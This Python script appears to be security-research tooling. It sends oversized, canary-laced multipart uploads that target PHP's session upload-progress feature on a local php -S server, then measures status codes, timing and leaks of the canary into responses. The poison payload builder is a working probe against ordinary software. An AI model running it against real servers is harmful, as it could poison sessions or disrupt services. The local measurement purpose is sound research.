#!/usr/bin/env python3
"""Stage-3: HTTP-response-only channel measurement against stock php:8.4.26-cli
(docker, php -S worker). No local instruments on the worker: observables are
only status code, headers, body bytes, timing, connection behavior.

Phases:
  A. 40 baseline GETs
  B. 3 canary-laced poisons (20x256KB filenames, canary token inside filenames)
  C. 40 follow-up GETs
  D. 10 small multipart probes (session+progress+1 file)
  E. 5 same-SID GETs using the poisoned SID (lock/Open file behavior)
Outputs: CSV rows to stdout + final JSON summary to stderr-printed file arg.
"""
import hashlib, http.client, json, sys, time

HOST, PORT = "127.0.0.1", int(sys.argv[1])
OUTJSON = sys.argv[2]
CANARY = sys.argv[3] if len(sys.argv) > 3 else "CNRYc0ffee15deadbeefc0ffee15deadbeef"

def part(name, value, fname=None):
    b = "--BND\r\nContent-Disposition: form-data; name=\"%s\"" % name
    if fname is not None:
        b += "; filename=\"%s\"" % fname
    b += "\r\n\r\n"
    return b.encode() + value + b"\r\n"

def poison_body(sid, key, canary):
    b = part("PHPSESSID", sid.encode()) + part("PHP_SESSION_UPLOAD_PROGRESS", key.encode())
    for i in range(20):
        fn = canary + "_%02d_" % i + "A" * (262144 - len(canary) - 4 - 4) + canary[-4:]
        b += part("p%d" % i, b"X", fn)
    return b + b"--BND--\r\n"

def small_body(sid, key, n=1):
    b = part("PHPSESSID", sid.encode()) + part("PHP_SESSION_UPLOAD_PROGRESS", key.encode())
    for i in range(n):
        b += part("f%d" % i, b"D", "s%d.txt" % i)
    return b + b"--BND--\r\n"

rows = []
bodies = {}

def record(tag, sid, st, dt, body, err=""):
    h = hashlib.sha256(body).hexdigest()[:16]
    rows.append(dict(tag=tag, sid=sid, status=st, latency=round(dt, 4),
                     body_len=len(body), body_sha=h, err=err))
    bodies.setdefault((st, h), body)

def do_get(sid, tag):
    c = http.client.HTTPConnection(HOST, PORT, timeout=60)
    t0 = time.perf_counter()
    try:
        hdrs = {}
        if sid:
            hdrs["Cookie"] = "PHPSESSID=%s" % sid
        c.request("GET", "/", headers=hdrs)
        r = c.getresponse()
        body = r.read()
        dt = time.perf_counter() - t0
        record(tag, sid, r.status, dt, body)
    except Exception as e:
        record(tag, sid, -1, time.perf_counter() - t0, b"", err=type(e).__name__)
    finally:
        c.close()

def do_post(sid, body, tag):
    c = http.client.HTTPConnection(HOST, PORT, timeout=90)
    t0 = time.perf_counter()
    try:
        c.request("POST", "/", body, {
            "Content-Type": "multipart/form-data; boundary=BND",
            "Content-Length": str(len(body))})
        r = c.getresponse()
        data = r.read()
        dt = time.perf_counter() - t0
        record(tag, sid, r.status, dt, data)
    except Exception as e:
        record(tag, sid, -1, time.perf_counter() - t0, b"", err=type(e).__name__)
    finally:
        c.close()

def phase_stats(tag):
    lat = [r["latency"] for r in rows if r["tag"] == tag and r["status"] >= 0]
    st = {}
    for r in rows:
        if r["tag"] == tag:
            st[r["status"]] = st.get(r["status"], 0) + 1
    if not lat:
        return {"tag": tag, "n": 0, "statuses": st}
    lat.sort()
    n = len(lat)
    mean = sum(lat) / n
    var = sum((x - mean) ** 2 for x in lat) / n
    return {"tag": tag, "n": n, "statuses": st, "lat_min": lat[0], "lat_med": lat[n // 2],
            "lat_max": lat[-1], "lat_mean": round(mean, 4), "lat_sd": round(var ** 0.5, 4)}

def main():
    psid = "dockerpoison01"
    print("phase,seq,tag,sid,http,latency_s,body_len,err", flush=True)
    for i in range(40):
        do_get(None, "A_baseline")
    canary = CANARY
    for i in range(3):
        do_post(psid, poison_body(psid, "dk%d" % i, canary), "B_poison")
    for i in range(40):
        do_get(None, "C_followup")
    for i in range(10):
        do_post("dp%03d" % i, small_body("dp%03d" % i, "sk%d" % i), "D_multipart_probe")
    for i in range(5):
        do_get(psid, "E_sameSID")
    for r in rows:
        print("x,x,%s,%s,%s,%s,%s,%s" % (r["tag"], r["sid"], r["status"], r["latency"],
              r["body_len"], r["err"]), flush=True)
    # canary scan across all body variants
    canary_hits = []
    for (st, h), body in bodies.items():
        if canary.encode() in body:
            canary_hits.append({"status": st, "sha": h})
    # distinct bodies (capped)
    body_variants = [
        {"status": st, "sha": h, "len": len(b), "hexdump_head": b[:400].decode("utf-8", "replace")}
        for (st, h), b in list(bodies.items())[:10]
    ]
    summary = {
        "canary": canary,
        "canary_found_in_responses": canary_hits,
        "phase_stats": [phase_stats(t) for t in
                        ("A_baseline", "B_poison", "C_followup", "D_multipart_probe", "E_sameSID")],
        "body_variants": body_variants,
        "n_rows": len(rows),
    }
    with open(OUTJSON, "w") as f:
        json.dump(summary, f, indent=2)

if __name__ == "__main__":
    main()
